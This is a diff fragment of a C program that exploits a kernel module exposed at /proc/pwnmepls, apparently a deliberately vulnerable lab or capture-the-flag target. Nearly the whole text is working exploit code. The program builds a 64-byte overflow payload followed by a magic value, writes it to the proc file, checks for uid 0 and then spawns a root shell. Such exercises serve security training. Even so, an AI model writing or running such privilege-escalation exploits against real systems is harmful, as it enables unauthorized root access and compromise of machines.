@@ -106,31 +106,26 @@ clean:
 #include <fcntl.h>
 
 int main() {
-    int fd = open("/proc/pwnmepls", O_WRONLY);
-    if (fd < 0) {
-        perror("open");
-        return 1;
-    }
-
+    // 1. Prepare the overflow payload
     char payload[64 + 8];
     memset(payload, 'A', 64);
     unsigned long win_val = 0x1337;
     memcpy(payload + 64, &win_val, 8);
 
-    printf("[+] Writing payload to /proc/pwnmepls...\n");
-    if (write(fd, payload, sizeof(payload)) < 0) {
-        perror("write");
-        return 1;
-    }
+    // 2. Trigger the overflow via write
+    int fd = open("/proc/pwnmepls", O_WRONLY);
+    if (fd < 0) { perror("open write"); return 1; }
+    write(fd, payload, sizeof(payload));
+    close(fd);
 
+    // 3. Verify root escalation
     if (getuid() == 0) {
         printf("[+] Success! We are root.\n");
         system("/bin/sh");
     } else {
-        printf("[-] Failed to get root. Check dmesg for win_condition value.\n");
+        printf("[-] Failed to get root.\n");
     }
 
-    close(fd);
     return 0;
 }
 ```
